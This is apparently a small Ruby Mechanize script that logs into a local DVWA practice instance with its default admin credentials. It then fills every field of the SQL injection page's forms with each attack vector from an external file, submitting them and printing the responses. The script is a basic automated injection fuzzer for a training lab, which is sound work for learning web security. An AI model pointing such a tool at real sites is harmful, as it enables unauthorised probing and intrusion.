require 'rubygems'
require 'mechanize'
require 'open-uri'
require 'uri'
require 'net/http'

agent = Mechanize.new
website = 'http://127.0.0.1/dvwa/' #ARGV[0]
vectors = File.readlines('vectors.txt')

page = agent.get(website)

form = page.form

form.username = 'admin'
form.password = 'password'

page = agent.submit(form, form.buttons.first)

#agent.get(website)

pp page

page = agent.get(website + "vulnerabilities/sqli/")

#page = agent.get(website)

forms = page.forms

forms.each do |form|
  vectors.each do |vector|
    form.fields.each do |field|
      field.value = vector
    end

    page = form.submit
    pp page
  end
end
